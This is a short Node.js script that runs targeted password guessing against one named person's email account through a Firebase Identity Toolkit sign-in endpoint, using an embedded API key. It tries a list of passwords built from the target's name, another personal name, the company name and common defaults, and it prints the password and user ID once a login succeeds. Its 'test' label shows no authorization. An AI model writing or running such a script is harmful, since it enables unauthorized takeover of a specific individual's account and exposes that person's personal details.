/**
 * Test passwords for abhinayav1919@kalpanaaa.in
 */
import https from 'https';

const API_KEY = 'AIzaSyB5sN1axynuVlmzK0k6lLrvL3PbsR7x0QA';

function signIn(email, password) {
  return new Promise((resolve) => {
    const url = `https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=${API_KEY}`;
    const bodyStr = JSON.stringify({ email, password, returnSecureToken: true });
    const u = new URL(url);
    const req = https.request({
      hostname: u.hostname,
      path: u.pathname + u.search,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(bodyStr)
      }
    }, res => {
      let data = '';
      res.on('data', c => data += c);
      res.on('end', () => {
        try {
          const parsed = JSON.parse(data);
          resolve({ status: res.statusCode, body: parsed });
        } catch {
          resolve({ status: res.statusCode, body: data });
        }
      });
    });
    req.write(bodyStr);
    req.end();
  });
}

async function main() {
  const email = 'abhinayav1919@kalpanaaa.in';
  const passwords = [
    'Abhinaya@123',
    'Abhinaya@1919',
    'Abhinaya@2024',
    'Abhinaya@2026',
    'abhinaya@123',
    'abhinaya123',
    'Kalpanaaa@123',
    'Koushik@777',
    'Admin@123456',
    'admin123',
    'Hr@123456',
    'hr123456',
    '12345678',
    'Kalpanaaa@2024'
  ];

  for (const pass of passwords) {
    const res = await signIn(email, pass);
    if (res.status === 200) {
      console.log(`\n🎉 FOUND PASSWORD!\nEmail: ${email}\nPassword: ${pass}\nUID: ${res.body.localId}\n`);
      return;
    } else {
      console.log(`Checked: ${pass} -> ${res.body.error?.message || res.status}`);
    }
  }
}

main().catch(console.error);
